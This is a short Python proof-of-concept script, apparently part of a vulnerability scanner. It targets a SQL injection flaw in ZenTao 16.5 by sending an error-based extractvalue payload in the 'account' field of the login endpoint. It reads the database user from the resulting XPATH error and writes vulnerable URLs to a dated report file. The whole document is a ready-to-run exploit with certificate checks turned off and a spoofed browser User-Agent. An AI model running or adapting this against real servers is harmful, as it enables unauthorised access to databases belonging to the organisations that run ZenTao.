import requests
import time
import buter
import wirtefile

filename = "./reps/禅道_16.5_router_SQL注入漏洞-"+str(time.strftime("%Y-%m-%d", time.localtime()))

poc = "/zentao/user-login.html"
data = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23"

def ZTrouteSQL(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
        "Referer":f"{url}{poc}",
    }
    try:
        reps = requests.post(url=url+poc, headers=headers,data=data, verify=False, timeout=5)
        if "XPATH syntax error" in reps.text:
            print(buter.colors.GREEN+  f"存在禅道_16.5_router_SQL注入漏洞 url : {url}" + buter.colors.END)
            reptext = url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现禅道_16.5_router_SQL注入漏洞 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)

